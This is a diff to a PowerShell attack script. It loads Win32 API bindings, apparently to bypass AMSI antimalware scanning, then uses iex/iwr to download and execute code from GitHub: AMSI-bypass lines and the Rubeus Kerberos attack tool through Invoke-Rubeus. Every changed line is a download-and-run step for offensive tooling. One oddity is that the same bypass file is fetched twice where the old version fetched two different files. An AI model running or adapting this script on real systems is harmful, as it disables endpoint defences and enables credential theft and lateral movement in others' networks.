@@ -19,11 +19,13 @@ public class Win32 {
 
 Add-Type $Win32
 
-sleep 3
-iex ( iwr http://127.0.0.1:8000/11.txt -UseBasicParsing)
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-sleep 1
-iex ( iwr http://127.0.0.1:8000/22.txt -UseBasicParsing )
+sleep 2
+iex ( iwr https://raw.githubusercontent.com/x4sh3s/AMSI_Lines/main/11.txt -UseBasicParsing)
+
+sleep 2
+iex ( iwr https://raw.githubusercontent.com/x4sh3s/AMSI_Lines/main/11.txt -UseBasicParsing )
 
 sleep 2
 iex ( iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1 -UseBasicParsing) ; invoke-rubeus -command "-h"
